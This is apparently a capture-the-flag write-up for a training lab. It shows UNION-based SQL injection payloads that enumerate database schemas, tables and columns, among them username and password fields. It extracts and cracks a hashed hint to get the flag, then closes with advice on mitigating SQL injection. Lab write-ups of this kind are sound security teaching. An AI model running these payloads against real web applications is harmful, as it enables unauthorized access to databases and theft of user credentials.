We notice there is a SQL injection vulnerability in the http://$IP/?page=member page

We try with different payloads until we find one that works:

First we get all the schemas and tables in the database:

ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
First name: Flag
Surname : GetThe

...

ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
First name: Member_Brute_Force
Surname : db_default

ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
First name: Member_Sql_Injection
Surname : users

ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
First name: Member_guestbook
Surname : guestbook

ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
First name: Member_images
Surname : list_images

ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
First name: Member_survey
Surname : vote_dbs





-------------------------------------------------------------------------------------





Then we get the tables and columns in the database:

...

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: db_default
Surname : id

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: db_default
Surname : username

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: db_default
Surname : password

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : user_id

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : first_name

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : last_name

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : town

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : country

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : planet

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : Commentaire

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : countersign

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: guestbook
Surname : id_comment

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: guestbook
Surname : comment

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: guestbook
Surname : name

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: list_images
Surname : id

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: list_images
Surname : url

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: list_images
Surname : title

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: list_images
Surname : comment

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: vote_dbs
Surname : id_vote

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: vote_dbs
Surname : vote

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: vote_dbs
Surname : nb_vote

ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
First name: vote_dbs
Surname : subject






------------------------------------------------------------------------------------


After looking around at different schemas, tables and columns, we find a flag in Member_images.list_images:


ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: one
Surname : me

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: two
Surname : me

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: three
Surname : me

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: Flag
Surname : GetThe

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: An image about the NSA !
Surname : Nsa

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: There is a number..
Surname : 42 !

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: Google it !
Surname : Google

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: Earth!
Surname : Earth

ID:  1 or 1 = 1 UNION SELECT comment, title from Member_images.list_images
First name: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Surname : Hack me ?



------------------------------------------------------------------------------------



After decrypting the MD5 hash, we get a text:
1928e8083cf461a51303633093573c46:albatroz

We then hash it with sha256 and get the flag:
echo -n 'albatroz' | sha256sum
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -



------------------------------------------------------------------------------------



Mitigating SQL Injection


1. Input Sanitization

Injection can be avoided by sanitizing any user input, rendering injected queries useless.
Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function.
This function escapes characters such as ' and ", so they don't hold any special meaning.

2. Input Validation

User input can also be validated based on the data used to query to ensure that it matches the expected input.
For example, when taking an email as input, we can validate that the input is in the form of ...@email.com, and so on.

3. User Privileges

BMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions.
Superusers and users with administrative privileges should never be used with web applications.
These accounts have access to functions and features, which could lead to server compromise.

4. Web Application Firewall

Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them.
This helps in preventing SQL Injection even when the application logic is flawed.
WAFs can be open-source (ModSecurity) or premium (Cloudflare).
Most of them have default rules configured based on common web attacks.
For example, any request containing the string INFORMATION_SCHEMA would be rejected, as it's commonly used while exploiting SQL injection.

5. Parameterized Queries

Another way to ensure that the input is safely sanitized is by using parameterized queries.
Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers.
Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.

The list above is not exhaustive, and it could still be possible to exploit SQL injection based on the application logic.